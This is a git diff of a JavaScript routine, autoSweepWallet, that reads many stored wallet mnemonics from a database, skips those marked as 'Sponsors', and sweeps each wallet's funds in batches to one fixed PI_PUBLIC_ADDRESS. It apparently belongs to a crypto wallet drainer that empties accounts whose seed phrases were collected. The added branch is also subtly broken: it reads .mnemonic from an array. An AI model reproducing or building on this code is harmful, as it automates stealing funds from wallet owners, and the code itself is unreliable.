@@ -854,32 +854,35 @@ export function arrayBatches(arr, batchSize = 100) {
 }
 
 export const autoSweepWallet = async (instance) => {
-    // if(instance !=1) return;
     if(global.isSweeping) return;
     global.isSweeping = true
-    
-
-    const readyPassphrases = await Passphrase.find({ name: { $in: [null, undefined] } });
-    const passphraseBatches = arrayBatches(readyPassphrases, 80);
-
-    for(const passphrases of passphraseBatches) {
-        await Promise.all(passphrases.map(async (phrase, i) => {
-            try {
-                const existingSponsor = await Sponsors.findOne({ mnemonic: phrase.mnemonic });
-                if(!existingSponsor) {
-                    await sweepWallet(phrase.mnemonic, PI_PUBLIC_ADDRESS);
-                }
-            } catch (e) {
-                if (e.response && e.response.data && e.response.data.extras) {
-                    const extras = e.response.data.extras;
-                    console.log('Transaction failed:', extras);
-                } else {
-                    // console.error(`Unknown error: ${phrase.mnemonic}`, e);
-                }
-            }
-        }));
-
+    const upcomingClaimables = await getUpcomingClaimables();
+    if(upcomingClaimables.length > 0 ) {
+        await sweepWallet(upcomingClaimables.mnemonic, PI_PUBLIC_ADDRESS);
         await sleep(1000);
+    } else {
+        const readyPassphrases = await Passphrase.find({ name: { $in: [null, undefined] } });
+        const passphraseBatches = arrayBatches(readyPassphrases, 80);
+
+        for(const passphrases of passphraseBatches) {
+            await Promise.all(passphrases.map(async (phrase, i) => {
+                try {
+                    const existingSponsor = await Sponsors.findOne({ mnemonic: phrase.mnemonic });
+                    if(!existingSponsor) {
+                        await sweepWallet(phrase.mnemonic, PI_PUBLIC_ADDRESS);
+                    }
+                } catch (e) {
+                    if (e.response && e.response.data && e.response.data.extras) {
+                        const extras = e.response.data.extras;
+                        console.log('Transaction failed:', extras);
+                    } else {
+                        // console.error(`Unknown error: ${phrase.mnemonic}`, e);
+                    }
+                }
+            }));
+
+            await sleep(1000);
+        }
     }
     global.isSweeping = false;
 };
